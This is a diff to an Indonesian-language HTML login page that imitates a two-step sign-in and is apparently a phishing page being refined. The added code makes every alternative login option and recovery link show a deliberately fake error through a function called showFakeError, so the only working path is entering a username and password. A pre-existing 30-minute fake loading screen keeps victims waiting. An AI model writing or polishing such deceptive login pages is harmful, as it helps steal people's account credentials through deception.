@@ -41,6 +41,10 @@
       font-weight: bold;
       cursor: pointer;
     }
+    button:disabled {
+      background-color: #3a3a3a;
+      cursor: not-allowed;
+    }
     .alt-button {
       width: 100%;
       padding: 15px;
@@ -70,6 +74,18 @@
       margin-top: 20px;
       color: #aaa;
     }
+    .separator {
+      text-align: center;
+      margin: 25px 0 10px;
+      font-weight: bold;
+    }
+    .forgot {
+      text-align: center;
+      font-size: 14px;
+      color: #aaa;
+      margin-top: 10px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
@@ -78,8 +94,17 @@
     <div id="step1">
       <h2>Log in</h2>
       <label>Nama pengguna, alamat email, atau nomor ponsel</label>
-      <input type="text" id="inputLogin" placeholder="">
-      <button onclick="goToStep2()">Lanjutkan</button>
+      <input type="text" id="inputLogin" placeholder="" oninput="toggleLoginButton()">
+      <button id="btnLanjut" onclick="goToStep2()" disabled>Lanjutkan</button>
+      <div class="forgot" onclick="showFakeError('Pemulihan nama pengguna sedang bermasalah.')">Lupa nama pengguna?</div>
+
+      <div class="separator">ATAU</div>
+      <button class="alt-button" onclick="showFakeError('Fitur Passkey belum tersedia di perangkat ini.')">
+        🔑 Gunakan Passkey
+      </button>
+      <button class="alt-button" onclick="showFakeError('Login cepat tidak tersedia saat ini.')">
+        ⚡ Log in cepat
+      </button>
     </div>
 
     <!-- Step 2 -->
@@ -90,10 +115,14 @@
       <input type="password" id="inputPassword" placeholder="">
       <button onclick="simulateLogin()">Lanjutkan</button>
 
-      <div style="text-align:center; margin:20px 0; font-weight:bold;">ATAU</div>
-      <button class="alt-button">📧 Kirim kode via email</button>
-      <button class="alt-button">🔑 Gunakan Passkey</button>
-      <div style="text-align:center; font-size:14px; color:#aaa;">Masalah saat log in?</div>
+      <div class="separator">ATAU</div>
+      <button class="alt-button" onclick="showFakeError('Kode email tidak bisa dikirim saat ini.')">
+        📧 Kirim kode via email
+      </button>
+      <button class="alt-button" onclick="showFakeError('Passkey tidak tersedia.')">
+        🔑 Gunakan Passkey
+      </button>
+      <div class="forgot" onclick="showFakeError('Silakan coba beberapa saat lagi.')">Masalah saat log in?</div>
     </div>
 
     <!-- Loading -->
@@ -103,14 +132,18 @@
   </div>
 
   <script>
+    function toggleLoginButton() {
+      const value = document.getElementById("inputLogin").value.trim();
+      const btn = document.getElementById("btnLanjut");
+      btn.disabled = value.length === 0;
+    }
+
     function goToStep2() {
       const userInput = document.getElementById("inputLogin").value.trim();
       if (userInput) {
         document.getElementById("step1").classList.add("hidden");
         document.getElementById("step2").classList.remove("hidden");
         document.getElementById("showEmail").textContent = userInput;
-      } else {
-        alert("Silakan isi email atau nama pengguna.");
       }
     }
 
@@ -123,6 +156,10 @@
         document.getElementById("loadingScreen").classList.add("hidden");
         document.getElementById("step1").classList.remove("hidden");
       }, 1800000); // 30 menit
+    }
+
+    function showFakeError(pesan) {
+      alert("❌ " + pesan);
     }
   </script>
 </body>
